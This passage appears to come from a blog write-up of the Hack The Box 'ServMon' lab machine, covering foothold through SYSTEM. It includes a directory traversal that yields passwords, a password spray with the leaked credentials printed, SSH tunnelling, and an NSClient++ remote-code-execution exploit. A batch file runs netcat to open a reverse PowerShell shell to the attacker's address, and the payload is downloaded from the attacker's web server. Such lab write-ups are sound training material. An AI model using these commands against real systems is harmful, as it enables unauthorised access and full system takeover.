<li>Scripted PoC: <a href="https://packetstormsecurity.com/files/157306/NSClient-0.5.2.35-Authenticated-Remote-Code-Execution.html">https://packetstormsecurity.com/files/157306/NSClient-0.5.2.35-Authenticated-Remote-Code-Execution.html</a></li>
</ul>
<h2 id="foothold">Foothold</h2>
<h3 id="shell-as-nadine">Shell as nadine</h3>
<blockquote>
<p>I&rsquo;ve added <code>htb.servmon</code>  to my <code>/etc/hosts</code>, so it will resolve to <code>10.10.10.184</code>. I know <code>htb.servmon</code> looks weird, but that&rsquo;s me in the past hehe..</p>
</blockquote>
<h4 id="nvms-1000-directory-traversal---obtain-passwordstxt">NVMS-1000 Directory Traversal - Obtain Passwords.txt</h4>
<p>I started BurpSuite and performed directory traversal based on the PoC above against NVMS-1000</p>
<p><div class="img-container"><img src="imgs/image-20210406234225362.png" alt="image-20210406234225362"  /></div>
</p>
<p>It returns a list of passwords</p>
<p><div class="img-container"><img src="imgs/image-20210406234232390.png" alt="image-20210406234232390"  /></div>
</p>
<h4 id="password-spraying">Password spraying</h4>
<p>I created a usernames list and a password list:</p>
<ul>
<li>
<p><code>users.txt</code></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">nathan
</span></span><span class="line"><span class="cl">nadine
</span></span></code></pre></div></li>
<li>
<p><code>passwords.txt</code></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">1nsp3ctTh3Way2Mars!
</span></span><span class="line"><span class="cl">Th3r34r3To0M4nyTrait0r5!
</span></span><span class="line"><span class="cl">B3WithM30r4ga1n5tMe
</span></span><span class="line"><span class="cl">L1k3B1gBut7s@W0rk
</span></span><span class="line"><span class="cl">0nly7h3y0unGWi11F0l10w
</span></span><span class="line"><span class="cl">IfH3s4b0Utg0t0H1sH0me
</span></span><span class="line"><span class="cl">Gr4etN3w5w17hMySk1Pa5$
</span></span></code></pre></div></li>
</ul>
<p>With these, a password spray can be performed using <code>CrackMapExec</code>. It hits on <code>nadine:L1k3B1gBut7s@W0rk</code> pair.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «servmon» «10.10.14.23»
</span></span><span class="line"><span class="cl">$ crackmapexec smb htb.servmon -u users -p passwords
</span></span><span class="line"><span class="cl">...&lt;SNIP&gt;...
</span></span><span class="line"><span class="cl">SMB         10.10.10.184    <span class="m">445</span>    SERVMON          <span class="o">[</span>+<span class="o">]</span> SERVMON<span class="se">\n</span>adine:L1k3B1gBut7s@W0rk 
</span></span><span class="line"><span class="cl">...&lt;SNIP&gt;...
</span></span></code></pre></div><h4 id="ssh-access">SSH access</h4>
<p>The credentials also work on SSH.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «servmon» «10.10.14.23»
</span></span><span class="line"><span class="cl">$ ssh nadine@htb.servmon
</span></span></code></pre></div><center>
<p><div class="img-container"><img src="imgs/image-20210407055115129.png" alt="image-20210407055115129"  /></div>
</p>
</center>
<h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="shell-as-system">Shell as SYSTEM</h3>
<h4 id="obtain-nsclient-password">Obtain NSClient++ password</h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">3) Upload the passwords
</span></span><span class="line"><span class="cl">4) Remove public access to NVMS
</span></span><span class="line"><span class="cl">5) Place the secret files in SharePoint
</span></span></code></pre></div><p>Recall the to do list from previous enumeration, I discovered a password for NSClient++ in its default installation folder.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">PS C:<span class="se">\&gt;</span> gc <span class="s1">&#39;Program Files\NSClient++\nsclient.ini&#39;</span>
</span></span></code></pre></div><center>
<p><div class="img-container"><img src="imgs/image-20210407055600651.png" alt="image-20210407055600651"  /></div>
</p>
</center>
<p>I&rsquo;ll try the <a href="https://packetstormsecurity.com/files/157306/NSClient-0.5.2.35-Authenticated-Remote-Code-Execution.html">scripted PoC</a>. But before that, I&rsquo;ll need to tunnel the connection first. This is because the config file is set to local only, so I can&rsquo;t perform exploit directly from outside.</p>
<h4 id="ssh-tunneling">SSH Tunneling</h4>
<p>SSH has tunneling features which allow me to access ServMon localhost and port from my localhost and specified port. For this, I&rsquo;ll create another SSH connection for tunneling.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «servmon» «10.10.14.23»
</span></span><span class="line"><span class="cl">$ ssh -L 8443:127.0.0.1:8443 nadine@10.10.10.184 
</span></span></code></pre></div><p><code>-L 8443:127.0.0.1:8443</code> means it will forward any connection on my localhost port 8443 to remote localhost  on port 8443. In this case, ServMon is the remote. Now I can perform exploitation.</p>
<h4 id="nsclient-exploit-poc">NSClient++ Exploit PoC</h4>
<p>First, I&rsquo;ll create a batch, called <code>sans.bat</code> file on my machine.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">@echo off
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">C:\Temp\nc.exe 10.10.14.23 443 -e powershell.exe
</span></span></code></pre></div><p>Once it created, I&rsquo;ll transfer the file to ServMon on <code>C:\temp\</code> via python http server along with <code>netcat</code> for windows.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «servmon» «10.10.14.23»
</span></span><span class="line"><span class="cl">$ Python -m SimpleHTTPServer <span class="m">80</span>
</span></span></code></pre></div><p>Get the hosted files on ServMon</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">PS C:<span class="se">\&gt;</span> Invoke-webrequest -uri http://10.10.14.23/reverse -outfile C:/temp/reverse.bat
</span></span><span class="line"><span class="cl">PS C:<span class="se">\&gt;</span> Invoke-webrequest -uri http://10.10.14.23/nc.exe -outfile C:/temp/nc.exe
</span></span></code></pre></div><p>Now I&rsquo;ll setup a listener on my Kali.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «servmon» «10.10.14.23»
</span></span><span class="line"><span class="cl">$ nc -nlvvp <span class="m">443</span>
</span></span></code></pre></div><p>Then I can just run the exploit and wait on my listener.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «servmon» «10.10.14.23»
</span></span><span class="line"><span class="cl">$ python3 nsRCE.py -t 127.0.0.1 -P <span class="m">8443</span> -p <span class="s1">&#39;ew2x6SsGTxjRwXOT&#39;</span> -c <span class="s2">&#34;c:\temp\reverse.bat&#34;</span>
</span></span></code></pre></div><p>Now I have an interactive shell as NT Authority\SYSTEM.</p>
<p><div class="img-container"><img src="imgs/image-20210407063703741.png" alt="image-20210407063703741"  /></div>
</p>
]]></content:encoded>
    </item>
    
  </channel>
</rss>
